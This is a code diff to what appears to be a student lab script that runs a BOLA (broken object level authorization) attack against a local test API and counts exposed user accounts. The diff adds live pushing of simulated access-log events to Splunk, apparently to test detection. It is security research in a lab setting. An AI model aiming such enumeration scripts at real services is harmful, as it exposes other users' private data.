@@ -10,6 +10,7 @@ import requests
 import time
 import json
 import datetime
+from splunk_utils import send_to_splunk
 
 TARGET = "http://localhost:8888"
 RESULTS = "/home/xd-strange24/mscproject/experiments"
@@ -25,6 +26,7 @@ def run(token, count=20):
 
     success = 0
     exposed = []
+    pushed = 0
 
     print("[*] Target: " + endpoint)
     print("[*] Sending " + str(count) + " requests...\n")
@@ -32,6 +34,11 @@ def run(token, count=20):
     for i in range(count):
         try:
             r = requests.get(endpoint, headers=headers, timeout=5)
+
+            log_line = '172.18.0.1 - - "GET /community/api/v2/community/posts/recent HTTP/1.1" ' + str(r.status_code)
+            if send_to_splunk(log_line):
+                pushed += 1
+
             if r.status_code == 200:
                 success += 1
                 data = r.json()
@@ -47,7 +54,7 @@ def run(token, count=20):
     print("\n[RESULT] " + str(success) + "/" + str(count) + " requests succeeded")
     print("[RESULT] " + str(len(exposed)) + " user accounts exposed")
     print("[SEVERITY] HIGH")
-    print("[SPLUNK] Check: index=api_logs community/posts/recent")
+    print("[SPLUNK] " + str(pushed) + "/" + str(count) + " events pushed live to index=api_logs")
 
     result = {
         "attack": "BOLA",
